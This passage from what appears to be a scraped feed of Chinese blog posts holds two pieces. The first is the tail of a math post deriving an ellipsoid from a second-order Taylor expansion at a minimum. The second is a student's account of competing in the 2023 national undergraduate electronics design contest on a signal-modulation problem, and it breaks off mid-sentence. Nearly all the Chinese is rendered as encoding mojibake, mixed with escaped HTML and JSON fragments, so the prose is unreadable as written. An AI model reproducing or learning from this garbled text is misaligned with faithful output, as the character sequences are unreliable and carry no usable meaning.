æ˜¯æå°å€¼ç‚¹æœ‰<span class=\"math inline\">\\(\\nabla{f(\\mathbf{X}^{*})}=\\mathbf{0}\\)</span> è€Œæ¶ˆå¤±ã€‚å¦‚æœç•¥å»é«˜é˜¶å°é¡¹ï¼Œé‚£ä¹ˆ</p>\n<p></p><div class=\"math display\">\\[f(\\mathbf{X})\\approx f(\\mathbf{X}^{*})+\\frac{1}{2}(\\mathbf{X}-\\mathbf{X}^{*})^T\\nabla^2f(\\mathbf{X}^{*})(\\mathbf{X}-\\mathbf{X}^{*})+O(||\\mathbf{X}-\\mathbf{X}^{*}||^2) \\tag{7}\n\\]</div><p></p><p>åˆå› ä¸º<span class=\"math inline\">\\(f(\\mathbf{X})=\\gamma\\)</span> ï¼Œæ‰€ä»¥å¾—åˆ°å¦‚ä¸‹è¿‘ä¼¼ç­‰å¼ï¼š</p>\n<p></p><div class=\"math display\">\\[f(\\mathbf{X}^{*})+\\frac{1}{2}(\\mathbf{X}-\\mathbf{X}^{*})^T\\nabla^2f(\\mathbf{X}^{*})(\\mathbf{X}-\\mathbf{X}^{*})=\\gamma \\tag{8}\n\\]</div><p></p><p>å…¶ä¸­<span class=\"math inline\">\\(f(\\mathbf{X}^{*})\\)</span>ä¸ºå·²çŸ¥å¸¸é‡ ï¼Œæ•´ç†å¯å¾—ï¼š</p>\n<p></p><div class=\"math display\">\\[(\\mathbf{X}-\\mathbf{X}^{*})^T\\nabla^2f(\\mathbf{X}^{*})(\\mathbf{X}-\\mathbf{X}^{*})=2(\\gamma-f(\\mathbf{X}^{*}))=constant \\tag{9}\n\\]</div><p></p><p>æŒ‰å‡è®¾<span class=\"math inline\">\\(\\nabla^2f(\\mathbf{X}^{*})\\)</span> æ­£å®šï¼Œç”±äºŒæ¬¡å‹ç†è®ºå¯çŸ¥ï¼Œå¼ï¼ˆ9ï¼‰æ˜¯ä»¥<span class=\"math inline\">\\(\\mathbf{X}^{*}\\)</span> ä¸ºä¸­å¿ƒçš„æ¤­çƒé¢æ–¹ç¨‹ã€‚</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-19 22:06</span>&nbsp;\n<a href=\"https://www.cnblogs.com/GeophysicsWorker\">GeoFXR</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">3</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "2023å¹´ç”µèµ›å›½èµ›ç»å†",
      "link": "https://www.cnblogs.com/badboy02/p/19623709",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/badboy02/p/19623709\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-02-19 14:06\">\n    <span>2023å¹´ç”µèµ›å›½èµ›ç»å†</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        <img alt=\"2023å¹´ç”µèµ›å›½èµ›ç»å†\" class=\"desc_img\" src=\"https://img2024.cnblogs.com/blog/3763221/202602/3763221-20260219000428689-1446099918.png\" />\n        2023å¹´å…¨å›½å¤§å­¦ç”Ÿç”µå­è®¾è®¡ç«èµ›ç»å†ï¼ŒDé¢˜ä¿¡å·é¢˜ï¼Œå›½èµ›äºŒç­‰å¥–ã€‚\nä¸€äº›æ¯”èµ›ç»å†å’Œç»éªŒæŠ€å·§\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>--- markdownæè¿°<br />\ntitle: ç”µèµ›2023å›½èµ›Dé¢˜æ¯”èµ›ç»å†<br />\ndate: 2023/8/15 11:52:25<br />\ncover: true<br />\nmathjax: false<br />\nsummary: æ¯”èµ›è¿‡ç¨‹å’Œä¸€äº›å‡†å¤‡å·¥ä½œçš„ç¢ç¢å¿µ<br />\ncategories: Note<br />\ntags:</p>\n<ul>\n<li>ç”µèµ›</li>\n<li>ä¿¡å·</li>\n</ul>\n<hr />\n<h2 id=\"è¡¥æ¡£å£°æ˜\">è¡¥æ¡£å£°æ˜</h2>\n<p>ç”±äºæˆ‘çš„åšå®¢æœåŠ¡å™¨å’Œå¤‡æ¡ˆåˆ°æœŸï¼Œæ‰€ä»¥é€‰æ‹©è½¬ç§»åˆ°åšå®¢å›­å¹³å°æ¥è¿›è¡Œä¿å­˜å’Œè®°å½•ã€‚ä»¥åä¹Ÿæœ‰å¯èƒ½ä¼šåœ¨ä¸Šé¢ä¸å®šæœŸæ›´æ–°ä¸€äº›æŠ€æœ¯ç±»åšå®¢ã€‚</p>\n<h2 id=\"å†™åœ¨å‰é¢\">å†™åœ¨å‰é¢</h2>\n<p>ğŸª“çªç„¶æ„è¯†åˆ°è‡ªå·±å·²ç»8ä¸ªæœˆæ²¡æ›´æ–°åšå®¢äº†ï¼Œè¿™æ®µæ—¶é—´å…¶å®ä¹Ÿæ²¡é‡ä¸Šå•¥å¤ªå¤æ‚çš„äº‹ï¼Œå¤§æ¦‚å°±æ˜¯ä¸€äº›æ²‰æ·€ä¹‹ç±»çš„ï¼Œå†³å®šäº†ä¹‹åçš„å­¦ä¸šå»å‘ï¼Œæ¨å…äº†æœ¬æ ¡çš„ç ”ç©¶ç”Ÿã€‚è¿›ä¸€æ­¥è®¤è¯†äº†ä¸€ç¾¤æœªæ¥å¿—åŒé“åˆçš„çš„åŒé—¨ï¼Œæ¿€æƒ…çˆ½ç©å¡å°”è¾¾æ—·é‡ä¹‹æ¯å’Œç‹å›½ä¹‹æ³ªï¼Œç‹ ç‹ åœ°æ²»æ„ˆäº†ä¸€é˜µå­çš„ç”µå­é˜³ç—¿ï¼Œä»¥åŠå¼€å§‹å¥èº«ï¼ˆå­˜ç–‘ï¼‰ã€‚<br />\nå½“ç„¶ï¼Œç”µèµ›ä»€ä¹ˆçš„ä¹Ÿæ˜¯æœ‰åœ¨å‡†å¤‡çš„ï¼Œç”±äºå›¢é˜Ÿå…¶ä»–ä¸¤ä¸ªéƒ½æ˜¯ç¡¬ä»¶ä½¬ï¼Œä»–ä»¬æ‰¿å—ç€ç”»æ¿ä¸ç„Šæ¥è°ƒè¯•çš„æ°´æ·±ç«çƒ­ï¼Œæˆ‘åªéœ€è¦å®‰å®‰é™é™çš„å†™ä»£ç å°±è¶³å¤Ÿäº†ï¼ˆç¬‘ï¼‰ï¼Œæ¯å¤©å®éªŒå®¤ä¸Šä¸‹ç­ï¼ŒæŠŠè‡ªå·±çš„éƒ¨åˆ†æå®šï¼Œç„¶åå»å¥èº«æˆ¿é”»ç‚¼ä¸€ä¼šï¼Œå›æ¥ç¾ç¾åŠ ä¸ªé¤æ´—ä¸ªæ¾¡ï¼Œç„¶åæ‰“æ‰“æœºå»ç¡è§‰ï¼Œä¹Ÿç®—æ˜¯æŸç§æ„ä¹‰ä¸Šçš„å¹³é™çš„ç”Ÿæ´»ï¼Œæ±‚ä¹‹ä¸å¾—ã€‚æ¯•ç«Ÿå½“åˆå†³å®šæ‰“ç”µèµ›è¯´åˆ°åº•ä¹Ÿåªæ˜¯ä¸ºäº†æå‡è‡ªå·±ï¼Œæ¢ç´¢ä¸€ä¸‹ç”µå­ä¸–ç•Œçš„å¥¥å¦™ï¼Œè¿™ä¹ˆä¹…èµ°è¿‡æ¥ä¹Ÿæ˜¯é‡åœ¨åšæŒï¼Œä¹Ÿå¸Œæœ›æœ€åèƒ½æœ‰ä¸€ä¸ªå¥½ç»“æœã€‚<br />\næˆªæ­¢åˆ°å†™åšå®¢çš„æ—¶å€™ï¼Œæˆ‘ä»¬ç»„çš„æˆç»©çœèµ›ä»¥çœä¸€å¹¶åˆ—ç¬¬ä¸€å‡ºçº¿ï¼Œç»¼åˆæµ‹è¯„åº”è¯¥ä¹Ÿèƒ½è¿‡çº¿ï¼Œå±±ä¸œå¤§å­¦å›½æµ‹å¤æµ‹ä¸å‡ºæ„å¤–çš„è¯ï¼Œåº”è¯¥æ˜¯å›½äºŒä»¥ä¸Šã€‚</p>\n<p>è¿™ç¯‡åšå®¢ä¼šåˆ†ä¸ºä¸Šä¸‹ä¸¤éƒ¨åˆ†ï¼Œä¸Šç¯‡ä¸»è¦æ˜¯æ¯”èµ›çš„è¿‡ç¨‹å’Œä¸€äº›å‰ç½®çš„å‡†å¤‡(æ²¡æœ‰è¥å…»çš„ç¢ç¢å¿µ)ï¼Œä¸‹ç¯‡ä¸»è¦æ˜¯ä¸€äº›ç®—æ³•å…·ä½“çš„å®ç°(ä¸€äº›æƒ…æ€¥ä¹‹ä¸‹çš„çµæœºä¸€åŠ¨ï¼Œå¤§ä½¬è½»é”¤)ã€‚</p>\n<h2 id=\"æ¯”èµ›è¿‡ç¨‹\">æ¯”èµ›è¿‡ç¨‹</h2>\n<ol>\n<li>å‡†å¤‡é˜¶æ®µ</li>\n</ol>\n<p>æˆ‘ä»¬é˜Ÿä¼ä¸€ç›´ä»¥æ¥è®­ç»ƒçš„æ˜¯ä»ªè¡¨å’Œé«˜é¢‘é¢˜ï¼Œä¸€å¼€å§‹ä¾§é‡FPGAé«˜é€Ÿä¿¡å·é‡‡é›†å’Œæ•°å­—åŸŸå¤„ç†è¿™ä¸€å—ï¼Œä½†æ˜¯åé¢é€æ¸æ„è¯†åˆ°ï¼Œå¯¹äºç”µèµ›çš„æŒ‡æ ‡èŒƒå›´å†…å¥½åƒä¹Ÿä¸éœ€è¦è¿™ä¹ˆé«˜çš„é¢‘ç‡ï¼Œé«˜è½½æ³¢å¸¦æ¥çš„é«˜é‡‡æ ·ç‡é—®é¢˜å¯ä»¥é€šè¿‡ä¸‹æ··é¢‘ç¼“è§£ï¼Œè€Œé«˜é¢‘ç›´é‡‡å¸¦æ¥æ˜¯çš„FIRæ»¤æ³¢å™¨çš„èµ„æºæ¶ˆè€—æˆå€å¢åŠ ï¼Œä»¥åŠæ•°å­—åŸŸå¤„ç†å¸¦æ¥çš„èµ„æºå ç”¨å’Œé‡åŒ–å™ªå£°é—®é¢˜ã€‚</p>\n<p><img alt=\"ZYNQ7100å¹³å°\" class=\"lazyload\" /><br />\nè¿™æ˜¯æˆ‘ä»¬å‡†å¤‡çš„ZYNQ7100çš„å¹³å°ï¼Œå¯ä»¥å¤–æ¥é«˜é€ŸADDAï¼Œæ¿è½½DDR3.<br />\nä½†æ˜¯å§ï¼ŒZYNQå¹³å°çš„ç»¼åˆé€Ÿåº¦å’Œå›ºåŒ–éš¾åº¦ä»¥åŠVerilogä»£ç çš„éªŒè¯éš¾åº¦ï¼Œåœ¨åˆ†ç§’å¿…äº‰çš„ç«èµ›é‡Œï¼Œå¦‚æœæ²¡æœ‰é•¿æœŸçš„è®­ç»ƒå’Œå‡†å¤‡ï¼Œåœ¨æ¯”èµ›é‚£å››å¤©ç€æ€¥ä¸Šå¤´å»å†™ï¼Œææ€•ä¼šç¿»è½¦ã€‚</p>\n<p>äºæ˜¯åœ¨è®­ç»ƒåæœŸåˆé‡å›STM32H743çš„å•ç‰‡æœºå¹³å°ï¼Œä¾§é‡æ¨¡å—å åŠ åçš„å¥å£®æ€§å’Œä»£ç çš„å¯å¤ç”¨æ€§ã€‚</p>\n<p>ä»è®­ç»ƒå¼€å§‹ï¼ŒğŸª“å°±æœ‰æ„è¯†åœ°æŠŠä¸€äº›ç®—æ³•ï¼Œå°¤å…¶æ˜¯FFTåˆ†æè¿™ä¸€å—ï¼Œå†™æˆäº†ç‹¬ç«‹çš„å‡½æ•°å»è¿›è¡Œä¸€äº›å‚æ•°çš„åˆ†æï¼Œç„¶åæŠŠå…¶ä»–çš„åƒæ˜¯å±å¹•æ˜¾ç¤ºï¼ŒæŒ‰é”®è¾“å…¥ï¼Œå¤–è®¾é©±åŠ¨ï¼Œéƒ½å°è£…æˆä¸»å¾ªç¯ä¸­çš„å‡½æ•°ï¼Œç”¨å‚æ•°å’Œæ ‡å¿—ä½å»æ§åˆ¶ã€‚ä¸å¾—ä¸è¯´åœ¨ç”µèµ›çš„ä¿¡å·åˆ†æé¢˜ä¸­è¿˜æ˜¯ä¸€ç§å¾ˆå¥½ç”¨çš„ä»£ç æ¶æ„ã€‚</p>\n<p><img alt=\"Mainå‡½æ•°æˆªå›¾\" class=\"lazyload\" /></p>\n<p>æœ¬æ¬¡ä»£ç çš„ç»„ç»‡ç»“æ„ï¼Œå¯ä»¥æ¸…æ¥šçš„çœ‹åˆ°ï¼Œæ˜¯é¦–å…ˆè¿›è¡ŒADCé‡‡é›†ï¼ŒFFTè®¡ç®—ï¼Œç„¶åå°†å‚æ•°ä¼ å…¥Judge_ModeTypeå‡½æ•°è®¡ç®—å‡ºè°ƒåˆ¶ç±»å‹ï¼Œç„¶åè¿›å…¥ç›¸åº”çš„éƒ¨åˆ†å»è¿›è¡Œåˆ†æå’Œæ˜¾ç¤ºã€‚</p>\n<p>2.æ­£å¼å¼€å§‹</p>\n<p>æ¯”èµ›çš„é‚£å‡ å¤©ï¼Œç¬¬ä¸€å¤©ä¸Šåˆ8ç‚¹é˜Ÿå‹ä¸€æ‹¿åˆ°é¢˜ç›®åŸºæœ¬ä¸Šå°±ç¡®å®šäº†æ˜¯Dé¢˜ï¼Œç„¶åå°±å¼€å§‹ç”»ç³»ç»Ÿæ¡†å›¾ï¼Œæ‰¾æ¨¡å—ï¼Œæ­ç³»ç»Ÿã€‚<br />\nğŸª“æ˜¯ä¹ç‚¹é’Ÿåˆ°çš„å®éªŒå®¤ã€‚ç„¶åä¸€çœ‹é¢˜ï¼Œå“¦è±ï¼ŒMaå’ŒMfï¼ è¿™ä¸æ˜¯è€æœ‹å‹å—ï¼Œå»å¹´çœèµ›è¿™ä¸¤ä½é‡é‡çº§ï¼Œç‰¹åˆ«æ˜¯Mfï¼Œè®©æ— æ•°é˜Ÿä¼åˆ¹ç¾½è€Œå½’ã€‚<br />\nå…¶å¥‡å¦™çš„å¤šå€¼å’Œè«åå…¶å¦™çš„ç®—ä¸å‡†é—®é¢˜ï¼Œéš¾åˆ°äº†ä¸€å¤§æ‰¹ç”µèµ›å£¬ã€‚<br />\nä¸è¿‡ç®—æ³•æ–¹é¢ğŸª“æ—©æœ‰åº”å¯¹ï¼Œå…·ä½“è¯·çœ‹åæ–‡åˆ†æã€‚<br />\né˜Ÿå‹æŠŠæ··é¢‘æ¨¡å—å¼„å¥½ï¼Œç¡®å®šå¥½ä¸­é¢‘é¢‘ç‡åï¼ŒæŠŠæ··é¢‘åçš„ä¿¡å·é€šå…¥ADCæ¨¡å—ï¼Œæ­¤æ—¶ğŸª“è¿›è¡Œäº†ç®€å•çš„æµ‹è¯•ï¼Œç¡®å®šäº†ADCé‡‡æ ·ç‡ã€‚<br />\nç„¶åå°±å¼€å§‹äº†ç®—æ³•çš„ç¼–å†™ã€‚åœ¨ç¬¬ä¸€å¤©çš„ä¸­åˆå°±æŠŠMaçš„è®¡ç®—æå®šäº†ï¼Œç²¾åº¦è¯¯å·®å¤§æ¦‚åœ¨0.05å·¦å³ã€‚<br />\nç„¶åä¸‹åˆæŠŠMfçš„ç®—æ³•ä¹ŸåŸºæœ¬è°ƒè¯•æ­£ç¡®äº†ï¼Œç²¾åº¦è¯¯å·®åœ¨0.2å·¦å³ï¼Œæœ‰å°‘é‡çš„å¤šå€¼é—®é¢˜ï¼Œè¿™æ—¶å€™æ—¶é—´å·²ç»æ˜¯ç¬¬ä¸€å¤©æ™šä¸Šçš„8ç‚¹ï¼ŒğŸª“è¿›è¡Œäº†ç¬¬ä¸€æ¬¡å¤‡ä»½ã€‚ï¼ˆæ—¶å¸¸å¤‡ä»½çœŸæ˜¯å¥½ä¹ æƒ¯ï¼‰<br />\n<img alt=\"å¤‡ä»½æˆªå›¾\" class=\"lazyload\" /><br />\nè¿™æ˜¯å·¥ç¨‹çš„å‡ æ¬¡å¤‡ä»½å›¾ï¼Œå¯ä»¥çœ‹åˆ°ä»7æœˆ17æ—¥ç¡®å®šäº†åŸºæœ¬å¹³å°ä¹‹åï¼Œå°±æ˜¯å‡ å¤©ä¸€å¤‡ä»½ï¼Œåœ¨æ¯”èµ›é‚£å‡ å¤©æ›´æ˜¯ä¸€å¤©å¤‡ä»½å‡ æ¬¡ã€‚<br />\nä¸ºä»€ä¹ˆæ²¡æœ‰ä½¿ç”¨gitä¹‹ç±»çš„ç‰ˆæœ¬æ§åˆ¶å·¥å…·å‘¢ï¼Œå› ä¸ºæˆ‘ä¸ä¼šï¼ˆå…¶å®æ˜¯æ‡’å¾—å»ºä»“åº“+æ²¡æ‰¾åˆ°åˆé€‚çš„æ‰˜ç®¡å¹³å°ï¼Œgithubè¿ä¸ä¸Šï¼Œgiteeä¸æƒ³ç”¨ï¼‰<br />\nç„¶åå°±æ˜¯ASKï¼ŒFSKï¼ŒPSKçš„åˆ¤åˆ«ã€è§£è°ƒä»¥åŠFSKçš„hå‚æ•°è®¡ç®—é—®é¢˜ï¼Œæ€»çš„è¯´æ¥ï¼Œè¿™ä¸ªèŠ±è´¹äº†ğŸª“ä¸€ç•ªåŠŸå¤«ï¼Œä¹Ÿç®—æ˜¯æœ€æ ¸å¿ƒçš„ä»£ç éƒ¨åˆ†ã€‚<br />\nç¬¬äºŒå¤©çš„ä¸­åˆå®Œæˆäº†æ¨¡æ‹Ÿè°ƒåˆ¶å’Œæ•°å­—è°ƒåˆ¶ä¸¤å¤§ç±»çš„åˆæ­¥åˆ¤æ–­ï¼Œä¸‹åˆè¿›ä¸€æ­¥å®Œæˆäº†æ¨¡æ‹Ÿçš„AMï¼ŒFMï¼ŒCWçš„è¿›ä¸€æ­¥åˆ¤æ–­ï¼Œä»¥åŠæ•°å­—çš„ASKï¼ŒFSKï¼ŒPSKçš„è¿›ä¸€æ­¥åˆ¤æ–­å’Œè§£è°ƒã€‚(å……å®çš„ä¸€å¤©)<br />\n<img alt=\"PSKè§£è°ƒ\" class=\"lazyload\" /><br />\nç¬¬äºŒå¤©æ™šä¸Šå›å¯å®¤çš„æ—¶å€™ğŸª“åœ¨å’Œé˜Ÿå‹é—²æ‰¯çš„æ—¶å€™çªç„¶æƒ³åˆ°äº†FSKçš„hå‚æ•°è®¡ç®—æ–¹æ³•ï¼Œç„¶ååœ¨å°æœ¬æœ¬ä¸Šè®°äº†ä¸‹æ¥ã€‚<br />\nç¬¬ä¸‰å¤©ï¼ŒğŸª“ä¸€åˆ°å®éªŒå®¤å°±å¼€å§‹ç€æ‰‹éªŒè¯è‡ªå·±çš„æƒ³æ³•ï¼Œå‘ç°å®Œå…¨å¯ä»¥ï¼Œç›´æ¥èŠœæ¹–èµ·é£ã€‚<br />\nç„¶åä¸‹åˆçš„æ—¶é—´å°±æ˜¯åŠ å…¥å°„é¢‘å¼€å…³å’Œæ»¤æ³¢å™¨ï¼Œæ”¾å¤§å™¨ç­‰åŸä»¶ï¼Œå®Œæˆäº†ç³»ç»Ÿçš„æ•´ä½“çº§è”å’Œæœ€åè§£è°ƒæ³¢å½¢çš„å®æ—¶åˆ‡æ¢ã€‚<br />\nç¬¬ä¸‰å¤©çš„æ™šä¸Šå…¶å®æ•´ä¸ªç³»ç»Ÿå·²ç»çº§è”å¹¶ä¸”æµ‹è¯•å¥½äº†ã€‚<br />\næœ€åä¸€å¤©å°±æ˜¯ä¸€äº›é”¦ä¸Šæ·»èŠ±çš„åŠŸèƒ½ï¼Œæ¯”å¦‚å®æ—¶é¢‘è°±æ˜¾ç¤ºå’ŒQPSKçš„åˆ¤æ–­ä»¥åŠé«˜é¢‘è½½æ³¢ä¸‹çš„è§£è°ƒä»¥åŠå‡†åº¦çš„ä¿®æ­£ï¼Œåœ¨ä¸‹åˆä¸‰ç‚¹å·¦å³å®Œæˆäº†æœ€åçš„æµ‹è¯•å’Œå°ç®±ã€‚<br />\n<img alt=\"å°ç®±\" class=\"lazyload\" /><br />\næ€»çš„æ¥è¯´è¿™å‡ å¤©çš„æµç¨‹è¿˜æ˜¯ç¨³æ‰ç¨³æ‰“ï¼Œé€æ­¥æ¨è¿›çš„ã€‚æˆ‘ä»¬å›¢é˜Ÿä¸€ç›´ä»¥æ¥é…åˆçš„ä¹Ÿå¾ˆä¸é”™ï¼Œæ•ˆç‡è´¼é«˜ï¼Œæœ€åå‘ˆç°å‡ºæ¥çš„æ•ˆæœå°±æ˜¯ç”µèµ›è¿™ä¸‰å¤©æ¯å¤©æ™šä¸Š11ç‚¹éƒ½å›å¯å®¤ç¡è§‰äº†ï¼Œç¬¬äºŒå¤©9ç‚¹å†åˆ°å®éªŒå®¤ï¼Œä¹Ÿè¿˜èƒ½å®Œæˆæ‰€æœ‰çš„åŸºç¡€å’Œæé«˜æŒ‡æ ‡å¹¶åšå‡º3é¡¹å…¶ä»–æŒ‡æ ‡ã€‚ä¸çŸ¥ä¸è§‰ä¸­å®Œæˆäº†æˆ‘ä»¬å›¢é˜Ÿåˆšå¼€å§‹æ¥è§¦ç”µèµ›çš„æ—¶çš„ä¸€ä¸ªç©ç¬‘-å¸Œæœ›ä»¥åèƒ½ä¸ç†¬å¤œå°±æ‰“å®Œç”µèµ›ã€‚<br />\n<img alt=\"äº¤ä½œå“\" class=\"lazyload\" /><br />\nä½œä¸ºä¸œé“ä¸»ï¼ŒåŠå¤œäº¤ä½œå“ä¹Ÿæ˜¯å¾ˆåˆç†çš„ç½¢ã€‚</p>\n<p>3.çœèµ›æµ‹è¯„</p>\n<p>å°ç®±åçš„ç¬¬äºŒå¤©å°±æ˜¯çœæµ‹äº†ï¼Œæ€»çš„æ¥è¯´è¿˜æ˜¯è›®é¡ºåˆ©çš„ï¼Œæ‰€æœ‰åŠŸèƒ½éƒ½æ¼”ç¤ºå‡ºæ¥äº†ï¼Œæµ‹è¯„è¡¨çš„æŒ‡æ ‡ä¹Ÿæ²¡æœ‰å¾ˆéš¾çš„ç‚¹ã€‚<br />\næµ‹å®Œç›´æ¥å’Œæœ‹å‹å‡ºå»å¿«ä¹åƒå–ï¼Œç­‰å¾…ç»¼åˆæµ‹è¯„åå•ã€‚</p>\n<p>4.ç»¼åˆæµ‹è¯„<br />\nç”±äºğŸª“ç†è®ºä¸Šæ˜¯çº¯è½¯ä»¶é˜Ÿå‘˜(å…¶å®ğŸª“ä¹Ÿä¼šç”»æ¿å­å’Œç„Šæ¿å­ï¼Œè¿™å°±æ˜¯EEerçš„ç´ å…»)ï¼Œç»¼åˆæµ‹è¯„çš„ç¡¬ä»¶å¤§ä¸šå½“ç„¶å°±äº¤ç»™æˆ‘çš„ä¸¤ä½å¤§çˆ¹é˜Ÿå‹äº†ï¼ŒğŸª“åªéœ€è¦åœ¨æ—è¾¹å†™ä¸ªæŠ¥å‘Šç®—ä¸ªå‚æ•°å°±å¥½ã€‚<br />\nåœ¨å‡†å¤‡ç¡¬ä»¶æµ‹è¯„å™¨ä»¶ï¼Œæˆ‘ä»¬æµ‹è¯•äº†å„ç§555ç”µè·¯ï¼ŒäºŒæç®¡æ£€æ³¢ï¼Œå¾®åˆ†ç§¯åˆ†å™¨ï¼ŒåŠ æ³•å™¨ï¼Œå¸¦é€šæ»¤æ³¢å™¨çš„ç”µè·¯å›¾ã€‚<br />\nç»¼åˆæµ‹è¯„é‚£å¤©ï¼Œä¸€è¿›ç°åœºï¼Œå‘ç°é¢˜ç›®ç«Ÿç„¶æ˜¯æ¨¡æ‹Ÿè®¡ç®—å™¨ï¼Œç”¨æ¥è§£ä¸€ä¸ªå¾®åˆ†æ–¹ç¨‹ã€‚<br />\nä¸è¿‡ç¨åŠ åˆ†æï¼Œå°±ä¼šå‘ç°å…¶æœ¬è´¨æ˜¯æ–‡æ°æ¡¥æ­£å¼¦å‘ç”Ÿå™¨ï¼Œä¸‰è§’æ³¢å‘ç”Ÿå™¨ï¼Œä¸¤ä¸ªç§¯åˆ†å™¨ï¼Œä¸€ä¸ªå¾®åˆ†å™¨ï¼Œä¸€ä¸ªåŠ æ³•å™¨çš„ç»„åˆã€‚<br />\nè¿™ä¸€é‡Œé¢çš„æ¯ä¸€é¡¹å•ç‹¬æ‹å‡ºæ¥éƒ½å¾ˆç®€å•ï¼Œä½†æ˜¯åœ¨å½“æ—¶æ—¶é—´æ¯”è¾ƒç´§ä¿ƒçš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è™½ç„¶æŠŠç”µè·¯å…¨éƒ¨çº§è”å‡ºæ¥äº†ï¼Œä½†æ˜¯åœ¨é›¶çŠ¶æ€çš„æ—¶å€™ï¼Œå¹¶æ²¡æœ‰åƒè®¡ç®—çš„é‚£æ ·ï¼Œäº§ç”Ÿä¸€ä¸ª33Hzçš„è‡ªæ¿€æ³¢å½¢ã€‚<br />\nä¹Ÿè®¸æ˜¯ä¸­é—´çš„æŸé¡¹RCå¸¸æ•°æ²¡æœ‰é…ç½®æ­£ç¡®ï¼Œä¹Ÿè®¸æ˜¯æŸä¸€æ®µæœªä¿®æ­£ç›¸å·®ï¼Œä¹Ÿè®¸æ˜¯æŸä¸€æ®µçš„åç½®éœ€è¦æ¶ˆé™¤ï¼Œæ€»æ˜¯é›¶çŠ¶æ€çš„æ—¶å€™å°±æ˜¯å¦¹æœ‰å‡ºæ³¢å½¢ã€‚<br />\nè¯´åˆ°æ¨¡æ‹Ÿè®¡ç®—ç”µè·¯ï¼Œå…¶å®è¿™æ˜¯ä¸ªå±•å¼€æ¥è®²æœ‰éå¸¸å¤šå¯ä»¥è®²çš„è¯é¢˜ï¼Œæƒ³è¿›ä¸€æ­¥ç ”ç©¶çš„åŒå­¦å¯ä»¥ç§»æ­¥CNPPå¤§ä½¬çš„æ¨¡æ‹Ÿè®¡ç®— <a href=\"https://hackaday.io/project/191142-analog-lorenz-attractor-computer/details\" rel=\"noopener nofollow\" target=\"_blank\">https://hackaday.io/project/191142-analog-lorenz-attractor-computer/details</a><br />\næˆ‘ä»¬ä¹Ÿå°±åœæ­¢äº†åé¢çš„è¾“å…¥æ¿€åŠ±ã€‚é™å¾…æ¯”èµ›æ—¶é—´ç»“æŸï¼Œæ¯•ç«Ÿè¿™åªæ˜¯ä¸€ä¸ªè¾¾æ ‡æµ‹è¯•ï¼Œå°±ä¸å†’è¿›å»åšè¿›ä¸€æ­¥çš„å†’é™©äº†ã€‚</p>\n<p>æœ‰ä¸€è¯´ä¸€ä¸­åˆå­¦æ ¡æä¾›çš„é¥­èœè¿˜å¯ä»¥ï¼Œèœå“æœ‰åœŸè±†çƒ§ç‰›è‚‰ï¼Œæœ¨è€³ç‚’è›‹ï¼Œæ°´ç…®è™¾ï¼Œè¿˜æœ‰é…¸å¥¶å’Œæ°´æœï¼Œæˆ‘TMåƒåƒåƒã€‚</p>\n<p>4.å›½èµ›è¯„æµ‹</p>\n<p>ç­‰ğŸª“ç©å›æ¥æ›´æ–°</p>\n<h2 id=\"é¢˜ç›®åˆ†æ\">é¢˜ç›®åˆ†æ</h2>\n<p><img alt=\"é¢˜ç›®æè¿°1\" class=\"lazyload\" /></p>\n<p><img alt=\"é¢˜ç›®æè¿°2\" class=\"lazyload\" /></p>\n<p><strong>é¢˜ç›®åˆ†æï¼ˆ*çš„æ•°é‡ä¸ºé‡è¦ç¨‹åº¦ï¼‰</strong></p>\n<ul>\n<li>é¢˜ç›®çš„è¾“å…¥ä¿¡å·æœ‰100mvï¼Œå±äºä¸€ä¸ªæ¯”è¾ƒå¤§çš„ä¿¡å·ï¼Œä»ä¿¡å·æºç›´å‡ºï¼Œé€šè¿‡SMAçº¿è¾“å…¥ï¼Œ<strong>ä¿¡å™ªæ¯”éå¸¸é«˜ï¼Œä¸éœ€è¦è€ƒè™‘ä¿¡å·åœ¨æ— çº¿ä¼ è¾“è¿‡ç¨‹ä¸­è¢«å¹²æ‰°å’Œå¤šå¾„æ•ˆåº”ç­‰é—®é¢˜</strong></li>\n<li>è½½æ³¢é¢‘ç‡2MHzï¼Œè¯´å®è¯ï¼Œæ˜¯ä¸€ä¸ªæ¯”è¾ƒå¾®å¦™çš„é¢‘ç‡ï¼Œåˆšå¥½è¶…è¿‡äº†å¸‚é¢ä¸Šå•ç‰‡æœºå†…ç½®ADCçš„æœ€å¤§é‡‡æ ·é¢‘ç‡ï¼Œä½†æ˜¯å¯¹äºFPGAå¤–æŒ‚çš„50Må·¦å³çš„é«˜é€ŸADCæ¥è¯´(AD9225:æ²¡é”™æ­£æ˜¯åœ¨ä¸‹)ï¼Œåˆçœ‹ä¸Šå»æ˜¯ä¸€ä¸ªå¾ˆåˆé€‚çš„é¢‘ç‡ã€‚æ‰€ä»¥ä½¿ç”¨å•ç‰‡æœºçš„ç»„ä¸€èˆ¬ä¼š<strong>é€‰æ‹©ä¸‹æ··é¢‘</strong>ï¼Œè€Œä½¿ç”¨FPGAçš„ç»„å¦‚æœé€‰æ‹©ç›´é‡‡ï¼Œç»è¿‡æˆ‘ä»¬å½“æ—¶çš„åˆ†æï¼Œå¯èƒ½ä¼šé‡åˆ°ä¸€äº›é—®é¢˜é—®é¢˜ï¼Œæ¯”å¦‚FFTåé¢‘ç‡åˆ†è¾¨ç‡ä¸å¤Ÿï¼ŒFIRèµ„æºæ¶ˆè€—å¤§å¸¦æ¥çš„ç»¼åˆæ…¢ï¼Œæ•°å­—ä¸‹æ··é¢‘ç›¸ä½ä¸å¯¹é½é€ æˆçš„å¤±çœŸå’Œè¯¯å·®(æ›´åˆ«æVivadoçš„FFTçš„IPæ 